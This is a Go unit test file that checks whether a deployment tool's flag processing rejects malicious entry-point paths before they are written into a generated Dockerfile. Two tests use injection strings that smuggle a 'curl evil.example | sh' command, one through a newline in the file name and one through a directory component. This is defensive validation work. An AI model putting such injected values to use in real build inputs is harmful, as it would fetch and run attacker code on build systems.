// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package agentengine

import (
	"strings"
	"testing"
)

// resetFlags restores the package-level flags var to a fresh, minimally
// valid state before each test, since computeFlags reads/writes it directly.
func resetFlags(t *testing.T, entryPointPath string) {
	t.Helper()
	tempDir := t.TempDir()
	flags = deployAgentEngineFlags{}
	flags.source.entryPointPath = entryPointPath
	flags.build.tempDir = tempDir
}

func TestComputeFlags_RejectsUnsafeEntryPointBasename(t *testing.T) {
	// The basename (with .go stripped) becomes f.build.execFile, embedded
	// directly into the generated Dockerfile's RUN/COPY/CMD lines.
	maliciousEntryPoint := "main\"\nRUN curl evil.example | sh\n#.go"
	resetFlags(t, maliciousEntryPoint)

	err := flags.computeFlags()
	if err == nil {
		t.Fatal("computeFlags() = nil, want an error rejecting the unsafe entry point basename")
	}
	if !strings.Contains(err.Error(), "entry point") {
		t.Errorf("computeFlags() error = %v, want it to mention the entry point", err)
	}
}

func TestComputeFlags_RejectsUnsafeOrigEntryPointPath(t *testing.T) {
	// origEntryPointPath is the raw --entry_point_path value, captured before
	// any path processing. execFile, by contrast, is derived only from the
	// basename of that path, so a malicious directory component doesn't
	// affect it. This payload keeps the basename clean ("main.go", so the
	// ".go"-extension strip and the execFile check both succeed) while the
	// directory component still carries shell metacharacters straight into
	// the Dockerfile's `RUN ... -o execFile origEntryPointPath` line.
	maliciousEntryPoint := "a;curl evil.example|sh#/main.go"
	resetFlags(t, maliciousEntryPoint)

	err := flags.computeFlags()
	if err == nil {
		t.Fatal("computeFlags() = nil, want an error rejecting the unsafe --entry_point_path value")
	}
	if !strings.Contains(err.Error(), "entry_point_path") {
		t.Errorf("computeFlags() error = %v, want it to mention --entry_point_path", err)
	}
}

func TestComputeFlags_AcceptsBenignValues(t *testing.T) {
	resetFlags(t, "main.go")

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error for benign values", err)
	}
	if flags.build.execFile != "main" {
		t.Errorf("execFile = %q, want %q", flags.build.execFile, "main")
	}
}
